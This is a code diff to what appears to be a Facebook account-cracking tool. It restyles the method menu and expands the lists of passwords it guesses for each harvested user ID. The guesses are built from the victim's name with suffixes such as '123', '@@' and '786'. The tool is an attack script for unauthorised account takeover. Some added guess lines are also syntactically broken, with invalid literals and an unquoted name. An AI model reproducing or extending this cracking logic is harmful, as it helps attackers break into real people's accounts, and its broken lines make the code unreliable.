@@ -163,6 +163,7 @@ def mentod():
     print(' %s[%s1%s] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
     print(' [%s2%s] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
     print(' [%s3%s] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
+
 #-------- LOADING ANIMASI ------------
 def loading():
     animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
@@ -171,7 +172,9 @@ def loading():
         sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
         sys.stdout.flush()
     print("")
+
 # LOGO
+
 def logo():
     print("""
 \033[1;96m█████████
@@ -187,7 +190,9 @@ def logo():
 \033[1;95m║\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m[https//:github.com/Em710]       \033[1;95m║
 \033[1;94m║\033[1;93m* \033[1;97mSupport \033[1;91m: \033[1;98m[Rʌɱzʌŋ] \033[1;95m[Gɱ & Aɗŋʌŋ] \033[1;96m[Hʌsɘɘɓ]   \033[1;93m║
 \033[1;94m╚═══════════════════════\033[1;91m══════════════════════╝""")
+
 #CRACK SELESAI
+
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
         print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Zee Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
@@ -256,7 +261,9 @@ def cek_apk(session,coki):
         else:
             print(f'\r')
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
+
 #METODE LOGIN
+
 ### MENU UTAMA ###
 def file():
             logo()
@@ -368,9 +375,11 @@ class __chigoue__:
     def __pler__(self):
         os.system('clear')
         logo()
-        print ('[1] Method {1}')
-        print ('[2] Method {2}')
-        print ('[3] Method {3}')
+        print('%s══════════════════════════════════════════\n %sMETHOD MENU%s'%(N,BM,N))
+        print(' %s[%s1%s] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
+        print(' [%s2%s] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
+        print(' [%s3%s] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
+
         yan = input('\n%s[%s+%s] Select Method : '%(H,H,H))
         if yan == '':
             print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
@@ -404,9 +413,9 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@@", xz[0]+"@"]
+                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@", xz[0]+"@@", xz[0]+"786"]
                        else:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@", xz[0]+"@@"]
+                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@", xz[0]+"@@", xz[0]+"786"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
@@ -420,9 +429,9 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@@", xz[0]+"@"]
+                           pwx = [name, 000786, 786786, Pakistan, xz[0]+"123", xz[0]+"1122", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@", xz[0]+"786"]
                        else:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@"]
+                           pwx = [name, 000786, 786787, Pakistan, xz[0]+"123", xz[0]+"1122", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@", xz[0]+"786"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
